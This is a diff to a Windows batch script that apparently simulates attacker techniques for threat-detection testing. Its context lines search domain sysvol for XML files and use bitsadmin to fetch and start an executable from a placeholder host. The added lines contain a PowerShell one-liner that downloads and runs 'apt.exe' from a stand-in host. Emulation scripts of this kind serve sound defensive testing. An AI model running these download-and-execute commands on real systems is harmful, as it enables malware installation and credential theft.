@@ -477,6 +477,8 @@ dir \\abc.local\sysvol\*.xml /a-d /s
 ECHO ============================
 cmd.exe /c bitsadmin /transfer TW /priority foreground https://example.com/apt.exe %USERPROFILE%\apt.exe && start %USERPROFILE%\apt.exe
 ECHO ============================
+powershell $b = $env:temp + '\RJklmtiTre.exe';WGet 'http://testsite/apt.exe' -outFiLe $b;start $b
+ECHO ============================
 ECHO ***************************************************
 ECHO Test already Finishied  ! Happy hunting threats :)
 ECHO ***************************************************
